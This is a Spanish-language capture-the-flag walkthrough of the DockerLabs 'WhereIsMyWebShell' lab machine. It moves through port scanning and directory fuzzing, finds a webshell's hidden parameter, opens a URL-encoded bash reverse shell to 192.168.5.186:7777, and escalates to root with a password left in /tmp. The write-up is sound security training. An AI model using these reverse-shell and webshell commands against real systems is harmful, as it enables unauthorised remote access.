# WhereIsMyWebShell DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip whereismywebshell.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh whereismywebshell.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____   
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__   
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]  

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 05:55 EST
Nmap scan report for insanity.dl (172.17.0.2)
Host is up (0.000040s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Academia de Ingl\xC3\xA9s (Inglis Academi)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds
```

Si entramos dentro de la pagina veremos una pagina normal, por lo que haremos un poco mas de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 2510]
/server-status        (Status: 403) [Size: 275]
/shell.php            (Status: 500) [Size: 0]
/warning.html         (Status: 200) [Size: 315]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos que encontramos `2` cosas bastantes interesantes si entramos en la siguiente pagina...

```
URL = http://<IP>/warning.html
```

Veremos lo siguiente:

```
Esta web ha sido atacada por otro hacker, pero su webshell tiene un parámetro que no recuerdo...
```

Por lo que vamos a realizar un poco de `fuzzing` en busca del parametro oculto en el `shell.php` que puede ejecutar codigo.

## WFUZZ

```shell
wfuzz -w <WORDLIST> -u 'http://<IP>/shell.php?FUZZ=whoami' --hh 0
```

Info:

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/shell.php?FUZZ=whoami
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000115401:   200        2 L      2 W        21 Ch       "parameter" 
```

Vemos que encontramos el parametro `parameter`, por lo que vamos a comprobarlo:

```
URL = http://<IP>/shell.php?parameter=whoami
```

Info:

```
www-data
```

Vemos que funciona, por lo que nos crearemos una `reverse shell` de la siguiente forma:

```
URL = http://<IP>/shell.php?parameter=bash -c "bash -i >%26 /dev/tcp/192.168.5.186/7777 0>%261"
```

Tendremos que sustituir los `&` en formato `URL` que seria `%26` para que se lo pueda tragar y lo interprete bien.

Pero antes de ejecutarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y ahora si ejecutamos lo de la `URL` y nos vamos donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 44808
bash: cannot set terminal process group (23): Inappropriate ioctl for device
bash: no job control in this shell
www-data@f19c77e8e3b7:/var/www/html$ whoami
whoami
www-data
```

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si vemos que archivos a creado el usuario `root`, veremos lo siguiente:

```shell
find / -type f -user root 2>/dev/null
```

Info:

```
................................<RESTO_CODIGO>...................................
/sys/module/drm/sections/___srcu_struct_ptrs
/sys/module/drm/sections/.altinstr_aux
/sys/module/drm/sections/__ex_table
/sys/module/drm/sections/__bpf_raw_tp_map
/sys/module/drm/sections/.rodata.str1.8
/sys/module/drm/sections/.export_symbol
/sys/module/drm/sections/.ref.data
/run/apache2/apache2.pid
/run/adduser
/tmp/.secret.txt
/.dockerenv
```

Vemos que hay una ruta interesante llamada `/tmp/.secret.txt` que si lo leemos veremos lo siguiente:

```
cat /tmp/.secret.txt
```

Info:

```
contraseñaderoot123
```

Por lo que vemos puede ser la contraseña de `root` por lo que haremos lo siguiente:

```shell
su root
```

Metemos como contraseña `contraseñaderoot123` y veremos que somos `root` por lo que habremos terminado la maquina.
